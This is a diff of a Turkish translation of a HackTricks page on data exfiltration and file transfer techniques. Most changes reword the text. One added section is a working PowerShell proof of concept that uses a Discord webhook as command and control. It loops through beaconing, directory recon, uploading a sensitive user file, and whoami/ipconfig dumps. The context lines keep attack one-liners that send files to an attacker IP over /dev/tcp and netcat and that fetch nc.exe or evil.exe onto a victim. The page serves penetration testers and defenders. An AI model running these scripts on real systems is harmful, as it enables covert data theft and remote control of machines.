@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Bilgi sızdırmak için yaygın olarak beyaz listeye alınmış alanlar
+## Bilgiyi exfiltrate etmek için yaygın olarak whitelisted olan alan adları
 
-Sıkça kötüye kullanılabilecek beyaz listeye alınmış alanları bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin.
+Suistimal edilebilecek yaygın olarak whitelisted yapılmış alan adlarını bulmak için [https://lots-project.com/](https://lots-project.com/) adresine bakın
 
 ## Copy\&Paste Base64
 
@@ -42,10 +42,10 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Dosya Yükleme
+### Dosya yükleme
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**GET ve POST'ları (aynı zamanda başlıkları) yazdıran SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Python modülü [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -59,7 +59,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Sunucusu**
+### **HTTPS Sunucu**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -100,6 +100,91 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+## Webhooks (Discord/Slack/Teams) için C2 & Data Exfiltration
+
+Webhooks, JSON kabul eden ve isteğe bağlı dosya parçalarını destekleyen yalnız yazma (write-only) HTTPS uç noktalarıdır. Genellikle güvenilen SaaS domainlerine izin verilir ve OAuth/API anahtarları gerektirmezler; bu da onları düşük sürtünmeli beaconing ve exfiltration için kullanışlı kılar.
+
+Key ideas:
+- Uç nokta: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data; payload_json adlı bir parça içinde {"content":"..."} bulunur ve opsiyonel olarak file adlı dosya parçası(ları) eklenir.
+- Operatör döngü deseni: periyodik beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK teslimatı onaylar.
+
+PowerShell PoC (Discord):
+```powershell
+# 1) Configure webhook and optional target file
+$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"
+
+# 2) Reuse a single HttpClient
+$client = [System.Net.Http.HttpClient]::new()
+
+function Send-DiscordText {
+param([string]$Text)
+$payload = @{ content = $Text } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] text -> $($resp.StatusCode)"
+}
+
+function Send-DiscordFile {
+param([string]$Path, [string]$Name)
+if (-not (Test-Path $Path)) { return }
+$bytes = [System.IO.File]::ReadAllBytes($Path)
+$fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+$json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
+$jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
+$mp = New-Object System.Net.Http.MultipartFormDataContent
+$mp.Add($jsonContent, "payload_json")
+$mp.Add($fileContent, "file", $Name)
+$resp = $client.PostAsync($webhook, $mp).Result
+Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
+}
+
+# 3) Beacon/recon/exfil loop
+$ctr = 0
+while ($true) {
+$ctr++
+# Beacon
+$beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
+Send-DiscordText -Text $beacon
+
+# Every 2nd: quick folder listing
+if ($ctr % 2 -eq 0) {
+$dirs = @("Documents","Desktop","Downloads","Pictures")
+$acc = foreach ($d in $dirs) {
+$p = Join-Path $env:USERPROFILE $d
+$items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
+if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
+}
+Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
+}
+
+# Every 3rd: targeted exfil
+if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }
+
+# Every 4th: basic recon
+if ($ctr % 4 -eq 0) {
+$who = whoami
+$ip  = ipconfig | Out-String
+$tmp = Join-Path $env:TEMP "recon.txt"
+"whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
+Send-DiscordFile -Path $tmp -Name "recon.txt"
+}
+
+Start-Sleep -Seconds 20
+}
+```
+Notlar:
+- Benzer desenler, incoming webhooks kullanan diğer işbirliği platformları (Slack/Teams) için de geçerlidir; URL ve JSON şemasını uygun şekilde ayarlayın.
+- Discord Desktop cache artifacts ve webhook/API kurtarma ile ilgili DFIR için bakınız:
+
+{{#ref}}
+../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
+{{#endref}}
+
 ## FTP
 
 ### FTP sunucusu (python)
@@ -150,7 +235,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ya da **samba** kullanarak bir smb paylaşımı oluşturun:
+Veya bir smb paylaşımı **samba kullanarak** oluşturun:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -175,13 +260,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Saldırganın SSHd'nin çalışıyor olması gerekir.
+Saldırganın SSHd'nin çalışır durumda olması gerekir.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Eğer kurbanın SSH'si varsa, saldırgan kurbanın bir dizinini saldırgana bağlayabilir.
+Eğer hedefte SSH varsa, saldırgan hedeften kendi makinesine bir dizini mount edebilir.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -194,19 +279,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Kurbandan dosya indir
+### victim'tan dosya indirme
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Kurbanın dosyasını yükle
+### Dosyayı hedefe yükle
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-**@BinaryShadow\_**'a teşekkürler
+teşekkürler **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -236,25 +321,25 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 Varsayılan olarak XP ve 2003'te (diğerlerinde kurulum sırasında açıkça eklenmesi gerekir)
 
-Kali'de, **TFTP sunucusunu başlat**:
+Kali'de, **start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Python'da TFTP sunucusu:**
+**TFTP sunucusu (python):**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**kurban** üzerinde, Kali sunucusuna bağlanın:
+**victim** üzerinde Kali sunucusuna bağlan:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Bir PHP oneliner ile bir dosya indirin:
+Bir dosyayı PHP oneliner ile indirin:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -296,18 +381,24 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` programı yalnızca ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda **hex'ten yeniden inşa etme yeteneğine de sahiptir**. Bu, bir ikilinin hex'ini sağlayarak, `debug.exe`'nin ikili dosya oluşturabileceği anlamına gelir. Ancak, debug.exe'nin **64 kb boyutuna kadar dosyaları birleştirme sınırlaması** olduğunu belirtmek önemlidir.
+Program `debug.exe` yalnızca ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda **hex'ten yeniden oluşturma yeteneğine** sahiptir. Bu, bir ikilinin hex'ini sağlayarak `debug.exe`'nin ikili dosyayı oluşturabileceği anlamına gelir. Ancak, `debug.exe`'nin **64 kb boyutuna kadar dosyaları oluşturma sınırlaması** olduğunu belirtmek önemlidir.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Sonra metni windows-shell'e kopyala-yapıştır yap ve nc.exe adında bir dosya oluşturulacak.
+Sonra metni windows-shell'e yapıştırın; nc.exe adında bir dosya oluşturulacaktır.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+
+## Referanslar
+
+- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
 {{#include ../banners/hacktricks-training.md}}
